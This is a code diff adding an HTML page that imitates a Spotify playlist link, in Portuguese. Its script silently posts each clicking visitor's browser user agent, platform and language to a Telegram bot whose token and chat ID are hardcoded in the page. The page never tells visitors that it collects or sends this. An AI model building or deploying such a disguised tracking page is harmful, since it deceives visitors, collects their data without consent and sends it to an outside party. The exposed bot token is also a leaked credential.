@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify | Playlist</title>
+
+    <link rel="icon" href="{{ url_for('static', filename='img/favicon.png') }}" type="image/png">
+    <style>
+        /* Estilos globais */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url(https://i.pinimg.com/originals/f0/b5/70/f0b570b1f9a73a0fdf0349b78dac493b.png);
+            background: 	linear-gradient(to bottom, #1abc54, #20b052, #16a085);
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            padding: 10px;
+        }
+
+        .card {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 350px;
+            width: 80%;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: block;
+            object-fit: cover;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin: 10px 0;
+        }
+
+        p {
+            font-size: 0.9rem;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        ul li {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .buttons {
+            margin-top: 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            text-decoration: none;
+            color: #fff;
+            background: #1abc54;
+            padding: 10px 20px;
+            margin: 5px;
+            border-radius: 200px;
+            font-size: 1rem;
+            width: 100%;
+            max-width: 150px;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: #234830;
+        }
+
+        /* Estilos responsivos */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.2rem;
+            }
+
+            .logo {
+                width: 80px;
+                height: 80px;
+            }
+
+            ul li {
+                font-size: 0.8rem;
+            }
+
+            .btn {
+                padding: 8px 15px;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Imagem redonda -->
+            <img src="https://i.postimg.cc/R0Dy9Qpb/transferir.png" class="logo">
+            <h1>PLAY LIST</h1>
+            <p>Pra sofre de mais</p>
+            <img src="https://i.postimg.cc/d0vg4Vk4/4bf96595468ab0a77843d96a7eba1bec.jpg" alt="Logo Bat" style=" width: 100%;">
+
+            <div class="buttons">                
+                <a target="_blank" class="btn" onclick="sendMessage">ACESSAR</a>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        // Substitua pelos seus dados
+        const botToken = '7325606102:AAEZMKj_t-sATwiJ84hVb7U-sVWg13sx4as';
+        const chatId = '7450047934';
+
+        function getBrowserInfo() {
+            return `Navegador: ${navigator.userAgent}\nPlataforma: ${navigator.platform}\nIdioma: ${navigator.language}`;
+        }
+
+        // Função para enviar mensagem
+        async function sendMessage(info) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `Olá! Esta é uma mensagem enviada pelo seu bot Telegram em JavaScript. 🎉\n'Alguém clicou no botão!\n\nInformações:\n${info}`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Mensagem enviada com sucesso!');
+                } else {
+                    console.error('Erro ao enviar mensagem:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Erro ao enviar mensagem:', error);
+            }
+        }
+
+        // Captura o clique do botão e envia os dados
+        document.querySelector('.btn').addEventListener('click', () => {
+            const browserInfo = getBrowserInfo();
+            sendMessage(browserInfo);
+        });
+
+    </script>
+
+
+
+</body>
+</html>
